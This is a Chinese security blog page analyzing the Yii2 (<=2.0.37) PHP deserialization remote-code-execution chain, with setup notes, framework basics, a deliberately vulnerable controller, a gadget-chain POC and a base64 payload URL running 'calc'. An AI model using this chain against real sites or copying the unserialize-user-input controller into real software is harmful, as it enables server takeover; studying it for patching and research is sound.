@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+  <head><meta name="referrer" content="no-referrer"/><meta name="generator" content="Hexo 6.3.0"></head>
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      YII2各版本反序列化分析 
+      
+      
+      |
+    
+     Prove yourself
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/myblog.ico">
+    <link rel="icon" href="/images/myblog.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Aecous</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">YII2各版本反序列化分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-11-06 15:52:17
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li>Yii2 &lt; 2.0.38</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz">https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz</a><br><a target="_blank" rel="noopener" href="https://www.yiichina.com/doc/guide/2.0/start-installation">https://www.yiichina.com/doc/guide/2.0/start-installation</a>     安装</p>
+<p>在 config&#x2F;web.php中设置密钥，用于生成cookie<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698336783422-ecf2ca99-cf90-42c6-af68-5621dbf54e95.png#averageHue=%23262829&clientId=u81a4ff89-b7ef-4&from=paste&height=525&id=u5b8a3f99&originHeight=525&originWidth=1013&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56222&status=done&style=none&taskId=u64f23a8a-6222-49b8-b5db-86033f71e92&title=&width=1013" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698337095669-7881fed5-da60-49df-ac69-0dfdc323cfda.png#averageHue=%23e9e8e8&clientId=u81a4ff89-b7ef-4&from=paste&height=892&id=u18725116&originHeight=892&originWidth=916&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55243&status=done&style=none&taskId=ua8d3c524-d0da-4b09-8c8b-1007f6de7bd&title=&width=916" alt="image.png"><br>访问 &#x2F;web&#x2F;index.php即可</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698337108616-53f3d91b-dd70-4582-b90e-e0e05adee4b0.png#averageHue=%23eae9e8&clientId=u81a4ff89-b7ef-4&from=paste&height=1187&id=u7b1df426&originHeight=1187&originWidth=1901&originalType=binary&ratio=1&rotation=0&showTitle=false&size=152601&status=done&style=none&taskId=ua6b743b8-b684-4df0-819d-bc93ad05563&title=&width=1901" alt="image.png"></p>
+<h3 id="YII基础知识"><a href="#YII基础知识" class="headerlink" title="YII基础知识"></a>YII基础知识</h3><p>基本都是复制，不爱看别看，我也不爱看，记着怕以后用上</p>
+<h4 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h4><p><a target="_blank" rel="noopener" href="https://www.yiichina.com/doc/guide/2.0/runtime-overview">https://www.yiichina.com/doc/guide/2.0/runtime-overview</a><br>大概看一眼就可以了</p>
+<h4 id="应用组件"><a href="#应用组件" class="headerlink" title="应用组件"></a>应用组件</h4><p>应用主体是<a target="_blank" rel="noopener" href="https://www.yiichina.com/doc/guide/2.0/concept-service-locator">服务定位器</a>， 它部署一组提供各种不同功能的 <em>应用组件</em> 来处理请求。 例如，urlManager组件负责处理网页请求路由到对应的控制器。 db组件提供数据库相关服务等等。<br>有点难以理解，我个人的理解就是 “一些写好的轮子”，可以用 Yii::$app-&gt;的方式去调用，并且还可以去自定义写轮子？这个我就没去深入理解了，因为我本身要复现漏洞，也不是一定要学会开发</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">[</span>
+    <span class="token string single-quoted-string">'components'</span> <span class="token operator">=></span> <span class="token punctuation">[</span>
+        <span class="token comment">// 使用类名注册 "cache" 组件</span>
+        <span class="token string single-quoted-string">'cache'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'yii\caching\ApcCache'</span><span class="token punctuation">,</span>
+
+        <span class="token comment">// 使用配置数组注册 "db" 组件</span>
+        <span class="token string single-quoted-string">'db'</span> <span class="token operator">=></span> <span class="token punctuation">[</span>
+            <span class="token string single-quoted-string">'class'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'yii\db\Connection'</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'dsn'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'mysql:host=localhost;dbname=demo'</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'password'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
+        <span class="token punctuation">]</span><span class="token punctuation">,</span>
+
+        <span class="token comment">// 使用函数注册"search" 组件</span>
+        <span class="token string single-quoted-string">'search'</span> <span class="token operator">=></span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">app<span class="token punctuation">\</span>components<span class="token punctuation">\</span>SolrService</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token punctuation">]</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="路由引导与创建URL"><a href="#路由引导与创建URL" class="headerlink" title="路由引导与创建URL"></a>路由引导与创建URL</h4><p>这个大概看一眼就行吧？反正我是感觉没太大意义</p>
+<h4 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h4><p><a target="_blank" rel="noopener" href="https://www.yiichina.com/doc/guide/2.0/runtime-requests">https://www.yiichina.com/doc/guide/2.0/runtime-requests</a><br>获取get和post参数用的</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$request</span> <span class="token operator">=</span> <span class="token class-name static-context">Yii</span><span class="token operator">::</span><span class="token variable">$app</span><span class="token operator">-></span><span class="token property">request</span><span class="token punctuation">;</span>
+
+<span class="token variable">$get</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token comment">// 等价于: $get = $_GET;</span>
+
+<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
+<span class="token comment">// 等价于: $id = isset($_GET['id']) ? $_GET['id'] : null;</span>
+
+<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
+<span class="token comment">// 等价于: $id = isset($_GET['id']) ? $_GET['id'] : 1;</span>
+
+<span class="token variable">$post</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token comment">// 等价于: $post = $_POST;</span>
+
+<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
+<span class="token comment">// 等价于: $name = isset($_POST['name']) ? $_POST['name'] : null;</span>
+
+<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
+<span class="token comment">// 等价于: $name = isset($_POST['name']) ? $_POST['name'] : '';</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>获取PUT PATCH或者其他request方法提交的参数</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$request</span> <span class="token operator">=</span> <span class="token class-name static-context">Yii</span><span class="token operator">::</span><span class="token variable">$app</span><span class="token operator">-></span><span class="token property">request</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 返回所有参数</span>
+<span class="token variable">$params</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token property">bodyParams</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 返回参数 "id"</span>
+<span class="token variable">$param</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">getBodyParam</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>判断请求方法</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$request</span> <span class="token operator">=</span> <span class="token class-name static-context">Yii</span><span class="token operator">::</span><span class="token variable">$app</span><span class="token operator">-></span><span class="token property">request</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token property">isAjax</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* 该请求是一个 AJAX 请求 */</span> <span class="token punctuation">&#125;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token property">isGet</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span> <span class="token comment">/* 请求方法是 GET */</span> <span class="token punctuation">&#125;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token property">isPost</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* 请求方法是 POST */</span> <span class="token punctuation">&#125;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token property">isPut</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span> <span class="token comment">/* 请求方法是 PUT */</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>检测url</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">url：返回 <span class="token operator">/</span>admin<span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">/</span>product<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> 此 <span class="token constant">URL</span> 不包括主机信息部分。
+absoluteUrl：返回 http<span class="token punctuation">:</span><span class="token comment">//example.com/admin/index.php/product?id=100, 包含host infode的整个URL。</span>
+hostInfo：返回 http<span class="token punctuation">:</span><span class="token comment">//example.com, 只有主机信息部分。</span>
+pathInfo：返回 <span class="token operator">/</span>product， 这个是入口脚本之后，问号之前（查询字符串）的部分。
+queryString：返回 id<span class="token operator">=</span><span class="token number">100</span>，问号之后的部分。
+baseUrl：返回 <span class="token operator">/</span>admin，主机信息之后， 入口脚本之前的部分。
+scriptUrl：返回 <span class="token operator">/</span>admin<span class="token operator">/</span>index<span class="token operator">.</span>php，没有路径信息和查询字符串部分。
+serverName：返回 example<span class="token operator">.</span>com，<span class="token constant">URL</span> 中的主机名。
+serverPort：返回 <span class="token number">80</span>，这是 web 服务中使用的端口。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>http头</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// $headers 是一个 yii\web\HeaderCollection 对象</span>
+<span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token class-name static-context">Yii</span><span class="token operator">::</span><span class="token variable">$app</span><span class="token operator">-></span><span class="token property">request</span><span class="token operator">-></span><span class="token property">headers</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 返回 Accept header 值</span>
+<span class="token variable">$accept</span> <span class="token operator">=</span> <span class="token variable">$headers</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Accept'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$headers</span><span class="token operator">-></span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'User-Agent'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* 这是一个 User-Agent 头 */</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.yiichina.com/doc/api/2.0/yii-web-request#$userAgent-detail">userAgent</a>：返回 User-Agent 头。</li>
+<li><a target="_blank" rel="noopener" href="https://www.yiichina.com/doc/api/2.0/yii-web-request#$contentType-detail">contentType</a>：返回 Content-Type 头的值， Content-Type 是请求体中MIME类型数据。</li>
+<li><a target="_blank" rel="noopener" href="https://www.yiichina.com/doc/api/2.0/yii-web-request#$acceptableContentTypes-detail">acceptableContentTypes</a>：返回用户可接受的内容MIME类型。 返回的类型是按照他们的质量得分来排序的。得分最高的类型将被最先返回。</li>
+<li><a target="_blank" rel="noopener" href="https://www.yiichina.com/doc/api/2.0/yii-web-request#$acceptableLanguages-detail">acceptableLanguages</a>：返回用户可接受的语言。 返回的语言是按照他们的偏好层次来排序的。第一个参数代表最优先的语言。</li>
+</ul>
+<h4 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h4><p>不想记了，直接丢链接<br><a target="_blank" rel="noopener" href="https://www.yiichina.com/doc/guide/2.0/runtime-responses">https://www.yiichina.com/doc/guide/2.0/runtime-responses</a></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在controllers目录中新建TestController.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controllers</span><span class="token punctuation">;</span>
+
+<span class="token keyword">use</span> <span class="token package">Yii</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">TestController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">actionTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token class-name static-context">Yii</span><span class="token operator">::</span><span class="token variable">$app</span><span class="token operator">-></span><span class="token property">request</span><span class="token punctuation">;</span>
+        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unserialize"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>POC</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'calc'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//yii:88/web/index.php?r=test/test&amp;unserialize=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjQ6ImNhbGMiO31pOjE7czozOiJydW4iO319fX0=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698339148712-05c8ea2a-90e3-4db8-af31-08f26ec3778b.png#averageHue=%23f5f4f4&clientId=ufd5f7826-1556-4&from=paste&height=1362&id=u8173f1d3&originHeight=1362&originWidth=1953&originalType=binary&ratio=1&rotation=0&showTitle=false&size=317053&status=done&style=none&taskId=ub42addc5-4178-4087-8abf-2b25f7fa863&title=&width=1953" alt="image.png"></p>
+<h3 id="漏洞分析-lt-x3D-2-0-37"><a href="#漏洞分析-lt-x3D-2-0-37" class="headerlink" title="漏洞分析 &lt;&#x3D;2.0.37"></a>漏洞分析 &lt;&#x3D;2.0.37</h3><p>查看2.0.38版本对于漏洞修复的提交<br><a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99?branch=9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99&diff=split">https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99?branch=9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99&diff=split</a><br>可以看见在framework&#x2F;db&#x2F;BatchQueryResult.php中增加了一个wakeup，很显然这个就是反序列化的入口<br>查看&#x2F;vendor&#x2F;yiisoft&#x2F;yii2&#x2F;db&#x2F;BatchQueryResult.php的__destruct函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698339473255-4f731ac5-3ff4-4a3a-914b-89ff02b7a100.png#averageHue=%23232626&clientId=ufd5f7826-1556-4&from=paste&height=328&id=u068c85a7&originHeight=492&originWidth=581&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49826&status=done&style=none&taskId=ue5ce2f55-96b1-48e8-a32e-1bab9dcbefd&title=&width=387.3333333333333" alt="image.png"><br>可以看见__destruct调用了reset函数，如果$this-&gt;_dataReader不为空，则调用其close函数，那么这里是可以去调用魔术函数__call方法的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698339564711-23688ad1-8fda-452e-9d6e-f2b008eccc02.png#averageHue=%236e8a5a&clientId=ufd5f7826-1556-4&from=paste&height=354&id=u5c672b91&originHeight=531&originWidth=868&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68833&status=done&style=none&taskId=u8acd3b2f-c449-4d8e-ab65-69af9d53137&title=&width=578.6666666666666" alt="image.png"><br>查找所有的__call方法，并且一个个排查<br>最终找到 &#x2F;vendor&#x2F;fzaninotto&#x2F;faker&#x2F;src&#x2F;Faker&#x2F;Generator.php<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698339620175-5fd6820e-9132-4dd2-9a1d-ee63465d69c3.png#averageHue=%23232525&clientId=ufd5f7826-1556-4&from=paste&height=398&id=u39d83ecc&originHeight=597&originWidth=1064&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67225&status=done&style=none&taskId=u1526eb72-7f81-497c-8782-c56f77627ee&title=&width=709.3333333333334" alt="image.png"><br>该call方法调用了format函数，进入format函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698339724042-6f4c42ca-238b-4ab3-99c4-3152be6bd383.png#averageHue=%23232525&clientId=ufd5f7826-1556-4&from=paste&height=107&id=u70e456d7&originHeight=160&originWidth=778&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17158&status=done&style=none&taskId=uaf77032e-d3c1-46a2-8a69-3053b39c73f&title=&width=518.6666666666666" alt="image.png"><br>查看getFormatter函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698339738267-43309d40-82d9-4c96-ad7a-77323c171a60.png#averageHue=%23242626&clientId=ufd5f7826-1556-4&from=paste&height=244&id=u996ffd0e&originHeight=366&originWidth=744&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51005&status=done&style=none&taskId=u669fb297-73f7-4c37-a0d7-65c769c4bbe&title=&width=496" alt="image.png"><br>我们可以通过控制$this-&gt;formatters键对应的值，从而控制call_user_func_array的一个参数，那么我们就需要一个参数可控导致RCE的函数<br>使用正则表达式进行查找call_user_func($this-&gt;([a-zA-Z0-9]+), $this-&gt;([a-zA-Z0-9]+)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698339861787-ca9c1ff3-a0fe-4a56-abce-31b28e995301.png#averageHue=%233e4c45&clientId=ufd5f7826-1556-4&from=paste&height=242&id=uc454900e&originHeight=363&originWidth=920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43587&status=done&style=none&taskId=ud995196f-5c14-4959-bc4b-9255b699928&title=&width=613.3333333333334" alt="image.png"><br>yii\rest\CreateAction::run()<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698339926079-430ec173-9fd2-45c9-b14b-00b89eb09660.png#averageHue=%23242626&clientId=ufd5f7826-1556-4&from=paste&height=337&id=u47a891a2&originHeight=505&originWidth=927&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80730&status=done&style=none&taskId=u2428238c-a5d5-44a9-afd2-1657790eecd&title=&width=618" alt="image.png"><br>yii\rest\IndexAction::run()<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1698339936456-0fd7182f-84d8-4174-93e1-b59e796f1a45.png#averageHue=%23232625&clientId=ufd5f7826-1556-4&from=paste&height=189&id=u7296b54c&originHeight=284&originWidth=577&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24996&status=done&style=none&taskId=u3de82422-5c60-465a-a8fb-a4cc85d8656&title=&width=384.6666666666667" alt="image.png"><br>两者均可，构造利用链</p>
